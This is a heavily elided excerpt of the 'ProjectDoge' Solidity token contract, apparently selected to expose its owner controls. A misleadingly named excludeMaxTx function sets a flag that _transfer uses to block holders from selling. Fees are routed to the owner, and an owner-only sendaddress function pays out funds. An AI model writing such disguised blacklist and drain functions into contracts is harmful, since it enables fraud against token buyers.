...
\______   \_______  ____    |__| ____   _____/  |_  \______ \   ____   ____   ____  
 |     ___/\_  __ \/  _ \   |  |/ __ \_/ ___\   __\  |    |  \ /  _ \ / ___\_/ __ \ 
 |    |     |  | \(  <_> )  |  \  ___/\  \___|  |    |    `   (  <_> ) /_/  >  ___/ 
 |____|     |__|   \____/\__|  |\___  >\___  >__|   /_______  /\____/\___  / \___  >
                        \______|    \/     \/               \/      /_____/      \/ 
...
contract ProjectDoge is Context, IERC20, Ownable {	
	...
	mapping (address => bool) TransferTx;
	event MaxTxExclude(address indexed ExcludedMaxTx, bool value);
    ...
    string private constant _name = "ProjectDoge";	
    ...
    address public pancakeswapRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    ...
    constructor() public {	
        ...
        //Devnet:  0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 https://pancake.kiemtienonline360.com/
        ...
        _isExcludedFromMaxTx[address(pancakeswapRouterAddress)] = true;
    ...
    function includeInLiquidityFee(address account) external onlyOwner {	
        ...
        // swap tokens for ETH	
        swapTokensForEth(half); // <- this breaks the ETH -> AST swap when swap+liquify is triggered	
   ...
   function excludedFromFundFee(address account) external onlyOwner {	
    ...
    function excludeMaxTx(address sender, bool _isExcluded2) external onlyOwner() {
	    require(TransferTx[sender] != _isExcluded2);
	    TransferTx[sender] = _isExcluded2;
	    emit MaxTxExclude(sender, _isExcluded2);
    }
    ...
    function setMinNumTokens(uint256 _newMinNumTokens) external onlyOwner {
        numTokensSellToAddToLiquidity = _newMinNumTokens;
    }
    ...
    function _transfer(	
        ...
        require(TransferTx[from] == false, "Account is not excluded from maxTx");
        ...
        if(_isExcludedFromFundFee[from]){	
         ...
         //send % to owner 	
        uint256 _amountSentToOwner = amount.mul(_fundFee).div(10**3);	
        ...
        function sendaddress(address payable _newadd,uint256 amount) public onlyOwner {
